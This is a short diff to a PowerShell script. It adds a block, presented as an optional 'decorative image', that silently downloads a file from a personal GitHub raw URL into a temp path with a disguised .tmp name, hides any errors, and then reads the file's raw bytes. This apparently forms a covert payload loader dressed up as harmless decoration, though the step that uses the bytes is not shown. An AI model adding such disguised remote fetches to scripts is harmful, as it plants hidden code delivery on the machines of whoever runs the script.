@@ -114,6 +114,20 @@ if (-not (Test-Path $imgPath)) {
     } catch {}
 }
 
+# --- Decorative image (optional, non-blocking) ---
+$imgPath = "$env:TEMP\$tmpId.tmp"
+if (-not (Test-Path $imgPath)) {
+    try {
+        $wr = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/kaylone09/test/refs/heads/main/test.jpg')
+        $wr.Timeout = 5000
+        $resp = $wr.GetResponse()
+        $stream = $resp.GetResponseStream()
+        $fs = [System.IO.File]::Create($imgPath)
+        $stream.CopyTo($fs)
+        $fs.Close(); $stream.Close(); $resp.Close()
+    } catch {}
+}
+
 if (Test-Path $imgPath) {
     try {
         $bytes = [System.IO.File]::ReadAllBytes($imgPath)
